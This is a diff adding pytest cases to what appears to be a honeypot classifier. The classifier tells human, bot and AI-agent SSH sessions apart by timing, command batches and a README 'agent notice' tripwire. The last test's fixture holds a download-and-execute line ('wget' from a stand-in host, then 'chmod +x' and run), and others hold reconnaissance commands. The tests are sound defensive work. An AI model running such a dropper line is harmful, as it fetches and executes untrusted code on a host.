@@ -239,3 +239,91 @@ def test_busy_ip_adds_bot_weight_but_leaves_other_kinds_alone():
     assert any(x.key == "repeat_visits" and x.label == "bot" for x in c.signals(s))
     # the 0.75 floor only lifts unknown or weaker bot verdicts
     assert c.score(s).kind == "human"
+
+
+# ---- agent notices, parallel tool calls, short plain sessions ----
+
+def _trip(s, wire, t=1.0):
+    s.observe({"type": "tripwire", "timestamp": f"1970-01-01T00:00:{t:06.3f}Z",
+               "detail": {"tripwire_id": wire, "reasons": [f"{wire} reason"]}})
+
+
+def test_reading_the_agent_notice_is_moderate():
+    s = Session("x")
+    _trip(s, "agent_notice_read")
+    sigs = c.tripwire_signals(s)
+    assert [x.key for x in sigs] == ["notice_read"]
+    assert sigs[0].label == "agent"
+    assert 0 < sigs[0].weight < c.WEIGHTS["tripwire"]
+
+
+@pytest.mark.parametrize("wire", ["agent_echo", "agent_hello"])
+def test_acting_on_the_notice_stays_strong(wire):
+    s = Session("x")
+    _trip(s, "agent_notice_read")
+    _trip(s, wire, 2.0)
+    keys = {x.key for x in c.tripwire_signals(s)}
+    assert keys == {"tripwire", "notice_read"}
+
+
+def test_notice_read_isnt_counted_twice_as_doc_reading():
+    s = _with_cmds([5], ["cat README.md", "ls"])
+    _trip(s, "agent_notice_read")
+    keys = [x.key for x in c.signals(s)]
+    assert "notice_read" in keys
+    assert "reads_docs" not in keys
+
+
+def _short_human():
+    """a real visitor: openssh, first try, 4 clean commands, read the home README."""
+    s = Session("x", client="SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5")
+    s.add_login(0.0, "team", True)
+    t = 3.0
+    for gap, line in [(0, "ls"), (7.5, "cat README.md"), (6.2, "whoami"), (5.1, "uptime")]:
+        t += gap
+        s.add_command(t, line, "")
+        if line == "cat README.md":
+            _trip(s, "agent_notice_read", t)
+    return s
+
+
+def test_short_plain_human_session_is_never_an_agent():
+    v = c.score(_short_human())
+    assert v.kind in ("human", "unknown")
+
+
+def test_one_own_signal_is_not_enough_to_win():
+    s = Session("x", client="SSH-2.0-OpenSSH_9.6")
+    s.add_login(0, "u", True)
+    s.add_command(1, "cat README.md", "")
+    s.add_command(9, "ls", "")
+    assert c.score(s) == c.UNKNOWN
+
+
+def test_parallel_tool_calls_still_read_as_steady():
+    # an agent that sometimes sends two commands from one model turn
+    gaps = [3.1, 0.02, 4.4, 5.0, 0.03, 3.6, 4.2, 6.0]
+    assert c.timing_signals(_with_cmds(gaps))[0].key == "timing_steady"
+
+
+def test_a_burst_of_lines_is_still_fast():
+    assert c.timing_signals(_with_cmds([0.01, 0.02, 0.01, 0.015]))[0].label == "bot"
+
+
+def test_steady_needs_enough_turns():
+    assert c.timing_signals(_with_cmds([5, 6, 5.5])) == []
+
+
+def test_labeled_batches_are_an_agent_habit():
+    lines = ["hostname; whoami; id; uname -a",
+             "nproc; free -h; echo '--- listening ---'; ss -tlnp",
+             "cat /etc/nginx/nginx.conf; echo ===README; cat README.md"]
+    s = _with_cmds([4, 5], lines)
+    keys = {x.key for x in c.content_signals(s)}
+    assert "labeled_batches" in keys
+    assert "semicolon_chain" not in keys
+
+
+def test_plain_semicolon_chains_are_still_bot():
+    s = _with_cmds([0.3, 0.3], ["cd /tmp; wget http://x.invalid/a; chmod +x a; ./a", "uname -a", "w"])
+    assert "semicolon_chain" in {x.key for x in c.content_signals(s)}
